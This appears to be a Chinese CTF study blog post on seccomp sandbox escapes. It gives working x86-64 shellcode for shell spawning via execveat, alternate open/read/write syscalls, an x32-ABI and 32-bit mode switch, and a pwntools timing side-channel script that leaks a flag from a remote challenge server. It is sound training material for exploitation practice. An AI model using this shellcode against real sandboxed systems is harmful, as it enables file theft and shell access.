---
title: 全面ORW
date: '2025-12-19 18:47:38'
updated: '2025-12-22 16:01:37'
---
# getshell 系统调用
**execve**

64 位系统调用号 59，32 位系统调用号 11

```c
execve(const char *pathname, char *const argv[], char *const envp[]);
```

参数：

1. 路径
2. 参数列表
3. 环境变量

**execveat**

64 位系统调用号 322，32 位系统调用号 358

```c
execveat(int dirfd, const char *pathname, char *const argv[], char *const envp[], int flags);
```

参数：

1. 目录文件描述符
2. 路径
3. 参数列表
4. 环境变量
5. 标志位 flags

```plain
xor r8, r8
xor r10, r10
push r10
mov rax, 0x68732f6e69622f2f
push rax
mov rsi, rsp
push r10
push rsi
mov rdx, rsp
push -100
pop rdi
mov rax, 322
syscall
```

# open 受限
## 只 ban open
用 openat 调用，系统调用号 32 位 295，64 位 257

[https://blog.csdn.net/timberwolf007/article/details/150451193](https://blog.csdn.net/timberwolf007/article/details/150451193)

```c
openat(int dirfd, const char *pathname, int flags);
openat(int dirfd, const char *pathname, int flags, mode_t mode);
```

参数：

1. 目录文件描述符，为 -100 `AT_FDCWD`则从当前路径开始查找
2. 文件路径，如果是以`/`开头说明是以绝对路径查找，前面的 dirfd 将被忽略
3. 文件打开标志

int flags: 文件打开标志

+ `O_RDONLY`: 只读打开
+ `O_WRONLY`: 只写打开
+ `O_RDWR`: 读写打开
+ `O_CREAT`: 文件不存在时创建
+ `O_EXCL`: 与 `O_CREAT` 配合使用，确保原子创建
+ `O_TRUNC`: 截断已存在的文件
+ `O_APPEND`: 追加模式
+ `O_NONBLOCK`: 非阻塞模式
+ `O_SYNC`: 同步写入
4. 文件权限，只在 flags 是`O_CREAT` 是有效

```plain
push 0x67616c66
mov rsi,rsp
xor rdx,rdx
mov rdi,0xffffff9c
push 257
pop rax
syscall

mov rdi,rax
mov rsi,rsp
mov edx,0x100
xor eax,eax
syscall

mov edi,1
mov rsi,rsp
push 1
pop rax
syscall
```

## ban open 和 openat
### 没有限制调用号小于0x40000000
用 x32-ABI 绕过沙盒，x32 ABI允许在64位架构下（包括指令集、寄存器等）使用32位指针

x32 ABI与64位下的系统调用方法几乎无异，只不过系统调用号都是不小于0x40000000，并且要求使用32位指针

具体的调用表可以查看系统头文件中的/usr/src/linux-headers-$version-generic/arch/x86/include/generated/uapi/asm/unistd_x32.h

```c
#ifndef _UAPI_ASM_UNISTD_X32_H
#define _UAPI_ASM_UNISTD_X32_H

#define __NR_read (__X32_SYSCALL_BIT + 0)
#define __NR_write (__X32_SYSCALL_BIT + 1)
#define __NR_open (__X32_SYSCALL_BIT + 2)
#define __NR_close (__X32_SYSCALL_BIT + 3)

//下略

#endif /* _UAPI_ASM_UNISTD_X32_H */
```

其中，__x32_SYSCALL_BIT为0x40000000，由头文件/usr/src/linux-headers-$version-generic/arch/x86/include/uapi/asm/unistd.h定义：

```c
#ifndef _UAPI_ASM_X86_UNISTD_H
#define _UAPI_ASM_X86_UNISTD_H

/*
 * x32 syscall flag bit.  Some user programs expect syscall NR macros
 * and __X32_SYSCALL_BIT to have type int, even though syscall numbers
 * are, for practical purposes, unsigned long.
 *
 * Fortunately, expressions like (nr & ~__X32_SYSCALL_BIT) do the right
 * thing regardless.
 */
#define __X32_SYSCALL_BIT	0x40000000

#ifndef __KERNEL__
# ifdef __i386__
#  include <asm/unistd_32.h>
# elif defined(__ILP32__)
#  include <asm/unistd_x32.h>
# else
#  include <asm/unistd_64.h>
# endif
#endif

#endif /* _UAPI_ASM_X86_UNISTD_H */
```

示例：

```plain
mov eax,0x67616c66
push rax
mov rdi,rsp
xor rsi,rsi
mov rax,0x40000002
syscall

mov rdi,rax
mov rax,rsp
add rax,0x100
mov rsi,rax
mov rdx,0x40
mov rax,0x40000000
syscall

mov edi,2
mov rax,0x40000001
syscall
```

但是因为这个 X32-ABI 实际的作用不大，可以直接切换 32 位，没必要维护一个独立于 32 位和 64 位的一个系统调用表，没什么意义所以在最新的 ubuntu24 当中已经把这个 X32-ABI 给删除了，没法调用到这个里面的系统调用

### 没有限制 arch
条件：

+ 沙箱中不包含对arch==ARCH_x86_64的检测
+ 存在或可构造32位地址的RWX内存段

64位模式对应的CS寄存器的值为0x33

64位系统下运行32位程序的模式，此CS寄存器的值为0x23

`retf (far return) `相当于：

```bash
pop ip
pop cs
```

`retfd (Far Return Double)`“d” 代表 Doubleword (32位)

`retfq (Far Return Quad)`“q” 代表 Quadword (64位)

构造RWX内存段可使用mmap申请新的内存，或使用mprotect使已有的段变为RWX权限

先mmap一段内存空间，迁移栈，再读入32位shellcode，最后转为32位模式

```plain
xor rax, rax
mov al, 9
mov rdi, 0x602000
mov rsi, 0x1000
mov rdx, 7
mov r10, 0x32
mov r8, 0xffffffff
mov r9, 0
syscall ; mmap for new stack

mov rax, 0
xor rdi, rdi
mov rsi, 0x602190
mov rdx, 100
syscall ; read x86 shellcode

xor rsp, rsp
mov esp, 0x602160
mov DWORD PTR [esp+4], 0x23 ; set CS register
mov DWORD PTR [esp], 0x602190 ; set new eip
retfd
```

为了方便，直接把 pwntools 的 arch 设置成 i386 方便后面的 32 位 orw，上面这段 shellcode 就直接发字节码：

```plain
shellcode=b'H1\xc0\xb0\tH\xc7\xc7\x00 `\x00H\xc7\xc6\x00\x10\x00\x00H\xc7\xc2\x07\x00\x00\x00I\xc7\xc22\x00\x00\x00I\xb8\xff\xff\xff\xff\x00\x00\x00\x00I\xc7\xc1\x00\x00\x00\x00\x0f\x05H\xc7\xc0\x00\x00\x00\x00H1\xffH\xc7\xc6\x90!`\x00H\xc7\xc2d\x00\x00\x00\x0f\x05H1\xe4\xbc`!`\x00g\xc7D$\x04#\x00\x00\x00g\xc7\x04$\x90!`\x00\xcb'
```

## ban 模式切换 x32-ABI open 和 openat
### openat2
64 位和 32 位系统调用号都是 437 诶

linux 内核在 5.6 之后开始有了一个 openat2 的系统调用，跟 openat 差别不大

```c
openat2(int dirfd, const char *pathname, struct open_how *how, size_t size);
```

参数：

1. 目录文件标识符，为 -100 `AT_FDCWD`则从当前路径开始查找
2. 文件路径，输入绝对路径则忽略 dirfd
3. 一个 how 结构体指针

```c
struct open_how {
    __u64 flags;
    __u64 mode;
    __u64 resolve;
};
```

其实就相当于把之前的 flags 和 mode 放进了一个结构体方便后续扩展，还添加了一个 resolve

4. how 结构体的大小 `sizeof(struct open_how)`

```plain
//shellcode=asm(shellcraft.openat2(-100,flag_addr,flag_addr+0x20,0x18))
mov eax,0x67616c66
push rax
xor rdi, rdi
sub rdi, 100
mov rsi, rsp
push 0
push 0
push 0
mov rdx, rsp
mov r10, 0x18
push 437
pop rax
syscall

mov rdi,rax
mov rsi,rsp
mov edx,0x100
xor eax,eax
syscall

mov edi,1
mov rsi,rsp
push 1
pop rax
syscall
```

# read 受限
## 用 sendfile 代替 read、write
系统调用号 64 位 40，32 位 187

```c
sendfile(int out_fd, int in_fd, off_t *offset, size_t count);
```

参数：

1. 输出文件描述符
2. 输入文件描述符
3. 读取偏移 offset
4. 传输字节数 count

```plain
mov rax,0x67616c66
push rax
push 257
pop rax
mov rsi, rsp
xor rdi, rdi
sub rdi, 100
xor rdx,rdx
xor r10,r10
syscall

mov r10d, 0x100
mov rsi, rax
push 40
pop rax
push 1
pop rdid
xor rdx,rdx
syscall
```

> 别忘了 openat 的 pathname 要么从根目录开始用绝对路径，要么让 dirfd = -100 然后从当前路径读取
>

## 用 read 变体
```c
cat /usr/include/asm/unistd_64.h | grep read
#define __NR_read 0
#define __NR_pread64 17
#define __NR_readv 19
#define __NR_readlink 89
#define __NR_readahead 187
#define __NR_set_thread_area 205
#define __NR_get_thread_area 211
#define __NR_readlinkat 267
#define __NR_preadv 295
#define __NR_process_vm_readv 310
#define __NR_preadv2 327
```

一个一个来：

**pread64**

64 位系统调用号 17，32 位系统调用号 180

```c
pread64(unsigned int fd, char __user *buf, size_t count, loff_t pos);
```

参数：

1. 文件标识符 fd
2. 写入内存指针
3. 写入长度
4. 文件偏移（file offset）

```plain
mov rdi,rax
mov rsi,rsp
mov edx,0x100
xor r10,r10
mov eax,17
syscall
```

**readv**

64 位系统调用号 19，32 位系统调用号 145

```c
readv(int fd, const struct iovec *iov, int iovcnt);
```

参数：

1. 文件标识符 fd
2. iovec 结构体数组

```c
struct iovec
{
    void __user *iov_base;
    __kernel_size_t iov_len;
};
```

这实际上就是read的后两个参数，也就是内存中的目的地址，与需要读取的长度

3. iovec 结构体数量

```plain
mov rdi,rax
push 0x100
push rsp
mov rsi,rsp
add rsp,8
xor rdx,rdx
add edx,1
mov eax,19
syscall
push 0x100
pop rdx
```

**preadv**

64 位系统调用号 295，32 位系统调用号 333

```c
preadv(int fd, const struct iovec *iov, int iovcnt, off_t offset);
```

参数：

1. 文件标识符 fd
2. iovec 结构体数组
3. iovec 结构体数量
4. 文件偏移 offset（从文件的一定偏移处开始读取）

```plain
mov rdi,rax
push 0x100
push rsp
mov rsi,rsp
add rsp,8
xor rdx,rdx
add edx,1
mov eax,295
xor r10,r10
syscall
push 0x100
pop rdx
```

**preadv2**

64 位系统调用号 327，32 位系统调用号 378

```c
preadv2(int fd, const struct iovec *iov, int iovcnt, off_t offset, int flags);
```

1. 文件标识符 fd
2. iovec 结构体数组
3. iovec 结构体数量
4. 文件偏移 offset（从文件的一定偏移处开始读取）
5. 控制标志位（置零就可以忽略这个参数了）

flags: 控制标志位（可位或）：

+ `RWF_HIPRI`: 高优先级读取，通常用于轮询（polling）模式
+ `RWF_DSYNC` / `RWF_SYNC`: 提供类似于 `O_SYNC` 的同步写保证（主要用于对应的 pwritev2）
+ `RWF_NOWAIT`: 如果数据不在页缓存（Page Cache）中，则立即返回 `EAGAIN`，不进行阻塞 I/O
+ `RWF_APPEND`: 仅对写操作有效

```plain
mov rdi, rax   
sub rsp, 64    
mov r10, rsp       
push 64        
push r10          
mov rsi, rsp       
mov rdx, 1      
xor r10, r10   
xor r8, r8        
mov rax, 327  
syscall
```

## 用 mmap
将文件或设备映射到进程的虚拟内存空间，实现文件磁盘地址和进程虚拟地址空间的映射

```c
mmap(void* start,size_t length,int prot,int flags,int fd,off_t offset);
```

参数：

1. 建议起始地址，为空则内核选择地址（需要页对齐）
2. 映射长度
3. 保护权限 prot：
+ `PROT_EXEC` 映射区域可被执行
+ `PROT_READ` 映射区域可被读取
+ `PROT_WRITE` 映射区域可被写入
+ `PROT_NONE` 映射区域不能存取
4. 映射标志符 flags：在调用时必须要指定`MAP_SHARED` 或`MAP_PRIVATE`
+ `MAP_FIXED`：使用指定的起始虚拟内存地址进行映射
+ `MAP_SHARED`：与其它所有映射到这个文件的进程共享映射空间（可实现共享内存）
+ `MAP_PRIVATE`：建立一个写时复制（Copy on Write）的私有映射空间
+ `MAP_ANONYMOUS`：匿名映射
5. 进行映射的文件描述符 fd
6. 文件偏移量 offset（从文件偏移处开始映射）

```plain
mov rdi,0
mov rsi,0x100
mov rdx,7
mov r10,2
mov r8,rax
mov r9,0
mov rax,9
syscall
```

## 限制 fd
例如限制了 read 的 fd 只能是 0，没法直接通过打开的 flag 的 fd 读取数据

可以通过 dup2 系统调用复制文件描述符：比如把打开的 flag 的 fd 3 复制到 0，再从 0 读取数据

> orw 也不需要标准输入了
>

**dup2**

64 位系统调用号 33，32 位系统调用号 63

```c
dup2(int oldfd, int newfd);
```

将 oldfd 复制到 newfd，如果 newfd 已经打开了会静默关闭再复制

把打开的 flag 的 fd 复制到 fd 0

```plain
mov rdi,rax
push 0
pop rsi
push 33
pop rax
syscall
```

**dup3**

64 位系统调用号 292，32 位系统调用号 330

```c
dup3(int oldfd, int newfd, int flags);
```

多了的 flags 参数只有`O_CLOEXEC`，flags 参数直接置 0 也可以正常复制

```plain
mov rdi,rax
push 0
pop rsi
push 0
pop rdx
push 292
pop rax
syscall
```

# write 受限
## 用 write 变体
```c
cat /usr/include/asm/unistd_64.h | grep write
#define __NR_write 1
#define __NR_pwrite64 18
#define __NR_writev 20
#define __NR_pwritev 296
#define __NR_process_vm_writev 311
#define __NR_pwritev2 328
```

跟 read 差不多，参数就不讲了

**pwrite64**

64 位系统调用号 18，32 位系统调用号 181

```c
pwrite(int fd, const void *buf, size_t count, off_t offset);
```

**writev**

64 位系统调用号 20，32 位系统调用号 146

```c
writev(int fd, const struct iovec *iov, int iovcnt);
```

**pwritev**

64 位系统调用号 296，32 位系统调用号 334

```c
pwritev(int fd, const struct iovec *iov, int iovcnt, off_t offset);
```

**pwritev2**

64 位系统调用号 328，32 位系统调用号 379

```c
pwritev2(int fd, const struct iovec *iov, int iovcnt, off_t offset, int flags);
```

### openat2+preadv2+pwritev2
```plain
push 0x67616c66
pop rax
push rax
xor rdi, rdi
sub edi, 100
push rsp
pop rsi
push 0
push 0
push 0
push rsp
pop rdx
push 0x18
pop r10
push 437
pop rax
syscall
          
push rax
pop r9
sub rsp, 64
mov r12, rsp
push 64
push r12
mov rsi, rsp
mov rdi, r9
mov rdx, 1
xor r10, r10
xor r8, r8
push 327
pop rax
syscall

mov r13, rax
mov [rsp + 8], r13
push 1
pop rdi
mov rsi, rsp
push 1
pop rdx
push -1
pop r10
xor r8, r8
push 328
pop rax
syscall
```

> 这真极限了... shellcode长度 0x6c = 108 字节
>
> 这里面 openat2 是 linux 内核 5.6 往上才有的，也就是 ubuntu 20.04.2 更新的 ubuntu 版本
>

## 侧信道爆破
在沙盒 seccomp 限制了只能使用 open 和 read 两种系统调用的情况下

可以用 open 和 read 把 flag 放到栈上然后一个字符一个字符 cmp，相同就陷入死循环，不同就结束

这样就可以利用判断字符的时间来得出这个字符是否正确，利用时间侧信道爆破 flag

重点 shellcode：

```python
payload = asm(shellcraft.open("flag"))
payload += asm(shellcraft.read(3, 'rsp', 0x80))
shellcode = '''
	mov al, byte ptr[rsi+{i}]
	cmp al, {ord(j)}
	je $-2
	ret
'''
```

exp：

```python
#!/usr/bin/env python3

from pwn import *

# context.log_level = 'debug'
context.arch = 'amd64'
charset = '-0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'

flag = 'LITCTF{'

for i in range (len(flag),50):
	for j in charset:
		global r
		# r = process('./shellcode')
		r = remote('node12.anna.nssctf.cn',22205)
		sleep(3)
		payload = asm(shellcraft.open("flag"))
		payload += asm(shellcraft.read(3, 'rsp', 0x80))
		shellcode = f'''
            mov al, byte ptr[rsi+{i}]
            cmp al, {ord(j)}
            je $-2
            ret
        '''
		payload += asm(shellcode)
		try:
			r.sendlineafter('Please input your shellcode: ', payload)
			start_time = time.time()
			r.clean(2)
			start_time = time.time() - start_time
			print('time = ' +  str(start_time) + '\n' + 'char = ' + str(j))
			r.close()
		except:
			pass
		else:
			if start_time > 2:
				flag += j
				break #这个break可以按照词典大小适当时备注掉
		print('flag = ' + flag)
```

